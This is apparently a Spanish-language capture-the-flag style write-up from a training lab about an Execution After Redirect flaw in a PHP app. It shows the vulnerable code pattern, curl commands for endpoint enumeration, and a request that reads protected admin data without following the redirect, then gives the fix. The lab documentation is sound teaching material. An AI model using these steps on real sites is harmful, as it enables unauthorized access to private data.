@@ -1,0 +1,89 @@
+Execution After Redirect (EAR) - Writeup & Documentación Técnica
+
+Documentación técnica y análisis post-mortem sobre la vulnerabilidad Execution After Redirect (EAR) identificada y explotada en un entorno de pruebas basado en PHP.
+
+📌 Información del Entorno
+
+Plataforma: Hackviser
+
+Vulnerabilidad: Execution After Redirect (EAR)
+
+Stack Técnico: Nginx (Reverse Proxy) / Apache 2.4.56 (Debian) / PHP (PHPSESSID)
+
+🔍 Mecanismo de la Vulnerabilidad (EAR)
+
+Una vulnerabilidad de Execution After Redirect (EAR) ocurre cuando una aplicación web envía una cabecera de redirección HTTP pero omite la instrucción de terminación del script en el servidor:
+
+// Patrón de código vulnerable
+if (!isset($_SESSION['authenticated'])) {
+    header("Location: login.php");
+    // Falta exit() o die()
+}
+
+// El contenido protegido se sigue ejecutando y renderizando
+include('admin_dashboard.php');
+
+
+Cuando un cliente HTTP (como curl o herramientas de auditoría) realiza la petición sin seguir automáticamente las redirecciones:
+
+El servidor responde con una cabecera HTTP/1.1 302 Found.
+
+El interprete de PHP continúa la ejecución de las líneas posteriores.
+
+Los datos protegidos son renderizados e incluidos en el cuerpo de la respuesta HTTP (response body).
+
+🛠️ Metodología de Explotación
+
+1. Inspección Inicial y Comportamiento del Endpoint
+
+El envío de parámetros no válidos o vacíos al endpoint de autenticación (login.php) devolvía un código 400 Bad Request, deteniendo el flujo antes de alcanzar la lógica vulnerable:
+
+curl -i -s -c cookie.txt -b cookie.txt -X POST https://target-app.example/login.php \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "username=admin&password="
+
+
+2. Enumeración de Rutas
+
+Se realizó una enumeración rápida sobre controladores estándar para identificar la ruta encargada de gestionar las sesiones:
+
+for page in dashboard.php home.php admin.php panel.php user.php index.php account.php; do
+  http_status=$(curl -s -o /dev/null -w "%{http_code}" -b cookie.txt https://target-app.example/$page)
+  echo "$page -> $http_status"
+done
+
+
+Resultado: El archivo index.php devolvió un código 302 Found, confirmando ser el controlador principal de redirección.
+
+3. Explotación y Extracción de Datos
+
+Al consultar directamente index.php pasando la cookie de sesión predeterminada sin seguir la redirección, se interceptó el contenido renderizado por el servidor:
+
+curl -i -s -c cookie.txt -b cookie.txt https://target-app.example/index.php
+
+
+Datos Obtenidos (Censurados):
+
+Usuario: Fionnula Espinas
+
+Email: admin@bespinash.hv
+
+Teléfono: 705-XXX-XXXX (Censurado)
+
+⚠️ Notas Operativas y Troubleshooting
+
+Variables Reservadas en Zsh:
+En entornos Zsh, intentar asignar valores a la variable status genera el error zsh: read-only variable: status. Se debe utilizar un nombre alternativo como http_status.
+
+Resolución de Rutas:
+Peticiones directas a rutas inexistentes (como profile.php) devolvieron 404 Not Found, confirmando la importancia de realizar una fase previa de enumeración de endpoints.
+
+🛡️ Remediación
+
+Para corregir vulnerabilidades EAR en PHP, es obligatorio detener inmediatamente la ejecución tras enviar cualquier cabecera Location:
+
+// Patrón de código seguro
+if (!isset($_SESSION['authenticated'])) {
+    header("Location: login.php");
+    exit(); // Termina la ejecución inmediatamente
+}
